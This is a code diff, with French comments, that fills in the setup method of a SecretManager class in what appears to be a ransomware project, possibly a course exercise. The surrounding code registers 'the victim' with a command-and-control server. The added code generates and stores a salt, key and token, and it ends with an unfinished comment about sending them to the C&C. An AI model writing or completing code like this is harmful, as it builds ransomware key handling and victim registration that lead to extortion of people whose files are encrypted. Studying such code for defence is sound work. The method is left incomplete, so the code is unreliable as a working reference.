@@ -11,6 +11,7 @@ from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 
 from xorcrypt import xorfile
+from pathlib import Path
 
 
 
@@ -71,10 +72,25 @@ class SecretManager:
             self._log.error("Failed to register the victim to the CNC")
             raise Exception("Failed to register the victim to the CNC")
 
-    def setup(self)->None:
-        # main function to create crypto data and register malware to cnc
-        raise NotImplemented()
+    def setup(self) -> None:
+        # Vérifier si un fichier token.bin existe déjà
+        token_path = Path(self._path) / "token.bin"
+        if token_path.exists():
+            self._log.warning("A token file already exists, aborting setup")
+            return
 
+        # Créer les éléments cryptographiques (sel, clé et token)
+        salt, key, token = self.create()
+
+        # Sauvegarder les éléments cryptographiques localement
+        with open(token_path, "wb") as token_file:
+            token_file.write(token)
+
+        salt_path = Path(self._path) / "salt.bin"
+        with open(salt_path, "wb") as salt_file:
+            salt_file.write(salt)
+
+        # Envoyer les éléments cryptographiques au CN
     def load(self)->None:
         # function to load crypto data
         raise NotImplemented()
